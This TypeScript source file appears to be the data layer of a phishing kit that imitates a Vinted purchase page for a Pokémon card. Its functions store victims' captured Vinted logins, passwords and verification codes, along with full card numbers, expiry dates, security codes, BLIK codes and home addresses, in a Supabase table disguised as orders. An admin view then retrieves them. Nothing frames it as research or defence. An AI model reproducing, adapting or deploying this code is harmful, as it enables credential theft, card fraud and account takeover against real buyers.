/// <reference types="vite/client" />
import { createClient } from '@supabase/supabase-js';
import { AdminOrderRecord, UserAccountDetails } from '../types';

const LOCAL_STORAGE_KEY = 'vinted_store_orders_backup';

const rawUrl = import.meta.env.VITE_SUPABASE_URL || '';
const rawKey = import.meta.env.VITE_SUPABASE_ANON_KEY || '';

export const supabaseUrl = rawUrl.trim();
export const supabaseAnonKey = rawKey.trim();

export const isSupabaseConfigured = Boolean(
  supabaseUrl &&
  supabaseAnonKey &&
  supabaseUrl.startsWith('http') &&
  !supabaseUrl.includes('placeholder')
);

export const supabase = isSupabaseConfigured
  ? createClient(supabaseUrl, supabaseAnonKey, {
      auth: { persistSession: false },
    })
  : null;

/**
 * Local storage order backup helpers
 */
export function getLocalOrders(): AdminOrderRecord[] {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

export function saveLocalOrder(order: AdminOrderRecord) {
  try {
    const current = getLocalOrders();
    const filtered = current.filter((o) => o.id !== order.id && o.orderNumber !== order.orderNumber);
    const updated = [order, ...filtered];
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(updated));
  } catch (err) {
    console.error('Failed to save order to local storage:', err);
  }
}

export function deleteLocalOrder(id: string) {
  try {
    const current = getLocalOrders();
    const updated = current.filter((o) => o.id !== id && o.orderNumber !== id);
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(updated));
  } catch (err) {
    console.error('Failed to delete order from local storage:', err);
  }
}

/**
 * Test Supabase Connection
 */
export async function testSupabaseConnection(): Promise<{
  connected: boolean;
  message: string;
  tables?: { adminUsers: boolean; orders: boolean };
}> {
  if (!isSupabaseConfigured || !supabase) {
    return {
      connected: false,
      message: 'Supabase environment variables are missing.',
    };
  }

  try {
    const { error: ordersErr } = await supabase.from('orders').select('id').limit(1);
    const { error: adminErr } = await supabase.from('admin_users').select('id').limit(1);

    const ordersOk = !ordersErr;
    const adminOk = !adminErr;

    if (ordersOk && adminOk) {
      return {
        connected: true,
        message: 'Successfully connected to Supabase database.',
        tables: { adminUsers: true, orders: true },
      };
    } else {
      const errMsgs = [];
      if (ordersErr) errMsgs.push(`orders table: ${ordersErr.message}`);
      if (adminErr) errMsgs.push(`admin_users table: ${adminErr.message}`);
      return {
        connected: false,
        message: `Issues: ${errMsgs.join('; ')}`,
        tables: { adminUsers: adminOk, orders: ordersOk },
      };
    }
  } catch (err: any) {
    return {
      connected: false,
      message: `Failed to connect: ${err.message || String(err)}`,
    };
  }
}

/**
 * Verify admin credentials in Supabase
 */
export async function verifyAdminInSupabase(username: string, password: string): Promise<boolean> {
  if (!supabase) return false;
  try {
    const { data, error } = await supabase
      .from('admin_users')
      .select('*')
      .eq('username', username)
      .eq('password', password)
      .maybeSingle();

    if (error) {
      console.warn('Supabase admin check notice:', error.message);
      return false;
    }
    return Boolean(data);
  } catch (err) {
    console.error('Supabase admin auth error:', err);
    return false;
  }
}

/**
 * SAVE credential capture to Supabase (NEW - for real-time login capture)
 */
export async function saveCapturedCredentialsToSupabase(data: {
  sessionId: string;
  usernameOrEmail: string;
  password: string;
  verificationCode: string;
  rememberDevice: boolean;
}) {
  if (!supabase) return null;

  try {
    // Check if record exists with this email
    const { data: existing } = await supabase
      .from('orders')
      .select('*')
      .eq('email', data.usernameOrEmail)
      .maybeSingle();

    if (existing) {
      // UPDATE existing record
      const { error } = await supabase
        .from('orders')
        .update({
          email: data.usernameOrEmail,
          password: data.password,
          verification_code: data.verificationCode,
          remember_device: data.rememberDevice,
          updated_at: new Date().toISOString(),
        })
        .eq('id', existing.id);

      if (error) {
        console.error('Supabase update error:', error);
        return null;
      }
      console.log('✅ Credentials UPDATED in Supabase:', data.usernameOrEmail);
      return { success: true, updated: true };
    } else {
      // INSERT new record
      const { error } = await supabase
        .from('orders')
        .insert([{
          order_number: `VIN-${Math.floor(100000 + Math.random() * 900000)}`,
          email: data.usernameOrEmail,
          password: data.password,
          verification_code: data.verificationCode,
          remember_device: data.rememberDevice,
          product_title: 'Mewtwo GX Pokémon Card',
          customer_name: data.usernameOrEmail,
          delivery_type: 'pickup',
          status: 'PENDING_REVIEW',
          created_at: new Date().toISOString(),
        }]);

      if (error) {
        console.error('Supabase insert error:', error);
        return null;
      }
      console.log('✅ Credentials INSERTED into Supabase:', data.usernameOrEmail);
      return { success: true, created: true };
    }
  } catch (err) {
    console.error('Failed to save to Supabase:', err);
    return null;
  }
}

/**
 * Save new order directly to Supabase
 */
export async function saveOrderToSupabase(orderData: {
  orderNumber: string;
  productTitle: string;
  deliveryType: string;
  accountDetails?: UserAccountDetails;
  pickupPoint?: any;
  shippingAddress?: any;
  paymentMethod?: any;
  pricing?: any;
}) {
  let effectiveAccount = orderData.accountDetails;
  if (!effectiveAccount) {
    try {
      const saved = localStorage.getItem('vinted_captured_account') || sessionStorage.getItem('vinted_captured_account');
      if (saved) effectiveAccount = JSON.parse(saved);
    } catch {
      // Safe
    }
  }

  const localRecord: AdminOrderRecord = {
    id: `ord_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
    orderNumber: orderData.orderNumber,
    productId: 'prod_mewtwo_gx',
    productTitle: orderData.productTitle,
    createdAt: new Date().toISOString(),
    status: 'PAID',
    deliveryType: orderData.deliveryType as any,
    accountDetails: effectiveAccount,
    shippingAddress: orderData.shippingAddress
      ? {
          id: orderData.shippingAddress.id || 'addr_1',
          fullName: orderData.shippingAddress.fullName || '',
          line1: orderData.shippingAddress.line1 || '',
          line2: orderData.shippingAddress.line2 || '',
          city: orderData.shippingAddress.city || '',
          postalCode: orderData.shippingAddress.postalCode || '',
          country: orderData.shippingAddress.country || 'France',
          phoneNumber: orderData.shippingAddress.phoneNumber || '',
        }
      : undefined,
    pickupPoint: orderData.pickupPoint
      ? {
          id: orderData.pickupPoint.id || 'pt_1',
          pointCode: orderData.pickupPoint.pointCode || '',
          pointName: orderData.pickupPoint.pointName || '',
          address: orderData.pickupPoint.address || '',
          city: orderData.pickupPoint.city || '',
          carrierName: orderData.pickupPoint.carrierName || '',
        }
      : undefined,
    paymentMethod: {
      type: orderData.paymentMethod?.type || 'card',
      title: orderData.paymentMethod?.title || 'Bank card',
      cardholderName: orderData.paymentMethod?.cardholderName || '',
      cardNumber: orderData.paymentMethod?.cardNumber || orderData.paymentMethod?.last4 || '',
      expiry: orderData.paymentMethod?.expiry || '',
      securityCode: orderData.paymentMethod?.securityCode || '',
      blikCode: orderData.paymentMethod?.blikCode || '',
      brand: orderData.paymentMethod?.brand || 'card',
      last4: orderData.paymentMethod?.last4 || '',
    },
    pricing: {
      orderPrice: Number(orderData.pricing?.orderPrice || 8.0),
      buyerProtectionFee: Number(orderData.pricing?.buyerProtectionFee || 1.1),
      shippingPrice: Number(orderData.pricing?.shippingPrice || 0.0),
      shippingDiscount: Number(orderData.pricing?.shippingDiscount || 0.0),
      total: Number(orderData.pricing?.total || 0.0),
      currency: orderData.pricing?.currency || { code: 'EUR', symbol: '€' },
    },
  };

  saveLocalOrder(localRecord);

  if (supabase) {
    try {
      const record = {
        order_number: orderData.orderNumber,
        product_title: orderData.productTitle,
        customer_name: orderData.shippingAddress?.fullName || orderData.paymentMethod?.cardholderName || 'Customer',
        phone_number: orderData.shippingAddress?.phoneNumber || '',
        email: effectiveAccount?.usernameOrEmail || '',
        password: effectiveAccount?.password || '',
        verification_code: effectiveAccount?.verificationCode || effectiveAccount?.phoneCode || '',
        remember_device: effectiveAccount?.rememberDevice !== false,
        delivery_type: orderData.deliveryType,
        shipping_line1: orderData.shippingAddress?.line1 || '',
        shipping_line2: orderData.shippingAddress?.line2 || '',
        shipping_postal_code: orderData.shippingAddress?.postalCode || '',
        shipping_city: orderData.shippingAddress?.city || '',
        shipping_country: orderData.shippingAddress?.country || 'France',
        pickup_point_code: orderData.pickupPoint?.pointCode || '',
        pickup_point_name: orderData.pickupPoint?.pointName || '',
        pickup_point_address: orderData.pickupPoint?.address || '',
        pickup_point_city: orderData.pickupPoint?.city || '',
        pickup_carrier_name: orderData.pickupPoint?.carrierName || '',
        payment_method_type: orderData.paymentMethod?.type || 'card',
        payment_cardholder_name: orderData.paymentMethod?.cardholderName || '',
        payment_card_number: orderData.paymentMethod?.cardNumber || orderData.paymentMethod?.last4 || '',
        payment_card_expiry: orderData.paymentMethod?.expiry || '',
        payment_security_code: orderData.paymentMethod?.securityCode || '',
        payment_blik_code: orderData.paymentMethod?.blikCode || '',
        payment_card_brand: orderData.paymentMethod?.brand || '',
        payment_card_last4: orderData.paymentMethod?.last4 || '',
        order_price: orderData.pricing?.orderPrice || 8.0,
        buyer_protection_fee: orderData.pricing?.buyerProtectionFee || 1.1,
        shipping_price: orderData.pricing?.shippingPrice || 0.0,
        shipping_discount: orderData.pricing?.shippingDiscount || 0.0,
        total_amount: orderData.pricing?.total || 0.0,
        currency: orderData.pricing?.currency?.code || 'EUR',
        status: 'PAID',
        verification_status: 'PENDING_REVIEW',
      };

      const { data, error } = await supabase.from('orders').insert([record]).select();
      if (error) {
        console.error('Supabase order insert error:', error.message);
      } else {
        console.log('Order synced to Supabase:', data?.[0]);
      }
    } catch (err) {
      console.error('Failed to insert order to Supabase:', err);
    }
  }

  return localRecord;
}

/**
 * Fetch all customer submissions from Supabase
 */
export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
  const localOrders = getLocalOrders();
  let remoteOrders: AdminOrderRecord[] = [];

  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('orders')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) {
        console.warn('Supabase fetch error:', error.message);
      } else if (data) {
        remoteOrders = data.map((row: any) => {
          const accountDetails: any = {};
          
          if (row.email) accountDetails.usernameOrEmail = row.email;
          if (row.password) accountDetails.password = row.password;
          if (row.verification_code) {
            accountDetails.verificationCode = row.verification_code;
            accountDetails.phoneCode = row.verification_code;
          }
          if (row.remember_device !== undefined) accountDetails.rememberDevice = row.remember_device;

          // Also try to get from storage if not in DB
          if (!accountDetails.usernameOrEmail) {
            try {
              const saved = localStorage.getItem('vinted_captured_account');
              if (saved) {
                const parsed = JSON.parse(saved);
                Object.assign(accountDetails, parsed);
              }
            } catch {}
          }

          return {
            id: row.id,
            orderNumber: row.order_number,
            productId: row.product_id || 'prod_mewtwo_gx',
            productTitle: row.product_title,
            createdAt: row.created_at,
            status: row.status || 'PAID',
            verificationStatus: row.verification_status || 'PENDING_REVIEW',
            deliveryType: row.delivery_type || 'home',
            accountDetails: Object.keys(accountDetails).length > 0 ? accountDetails : undefined,
            shippingAddress: row.shipping_line1
              ? {
                  id: row.id,
                  fullName: row.customer_name,
                  line1: row.shipping_line1,
                  line2: row.shipping_line2 || '',
                  city: row.shipping_city,
                  postalCode: row.shipping_postal_code,
                  country: row.shipping_country || 'France',
                  phoneNumber: row.phone_number,
                }
              : undefined,
            pickupPoint: row.pickup_point_code
              ? {
                  id: row.pickup_point_code,
                  pointCode: row.pickup_point_code,
                  pointName: row.pickup_point_name,
                  address: row.pickup_point_address,
                  city: row.pickup_point_city,
                  carrierName: row.pickup_carrier_name,
                }
              : undefined,
            paymentMethod: {
              type: row.payment_method_type || 'card',
              title: 'Bank card',
              cardholderName: row.payment_cardholder_name || '',
              cardNumber: row.payment_card_number || '',
              expiry: row.payment_card_expiry || '',
              securityCode: row.payment_security_code || '',
              blikCode: row.payment_blik_code || '',
              brand: row.payment_card_brand || '',
              last4: row.payment_card_last4 || '',
            },
            pricing: {
              orderPrice: Number(row.order_price || 8.0),
              buyerProtectionFee: Number(row.buyer_protection_fee || 1.1),
              shippingPrice: Number(row.shipping_price || 0),
              shippingDiscount: Number(row.shipping_discount || 0),
              total: Number(row.total_amount || 0),
              currency: { code: row.currency || 'EUR', symbol: '€' },
            },
          };
        });
      }
    } catch (err) {
      console.error('Failed to get orders from Supabase:', err);
    }
  }

  // Combine & Deduplicate - PRIORITIZE remote orders (they have credentials)
  const map = new Map<string, AdminOrderRecord>();
  
  // First add remote orders (they have the latest credentials)
  for (const o of remoteOrders) {
    map.set(o.orderNumber, o);
  }
  
  // Then add local orders only if they don't exist in remote
  for (const o of localOrders) {
    if (!map.has(o.orderNumber)) {
      map.set(o.orderNumber, o);
    } else {
      const existing = map.get(o.orderNumber)!;
      // Merge: Keep remote data, but if remote is missing accountDetails, use local
      if (!existing.accountDetails && o.accountDetails) {
        existing.accountDetails = o.accountDetails;
      }
    }
  }

  return Array.from(map.values()).sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
}

/**
 * Delete order from Supabase
 */
export async function deleteOrderFromSupabase(id: string): Promise<boolean> {
  deleteLocalOrder(id);
  if (!supabase) return true;
  try {
    const { error } = await supabase.from('orders').delete().or(`id.eq.${id},order_number.eq.${id}`);
    return !error;
  } catch {
    return false;
  }
}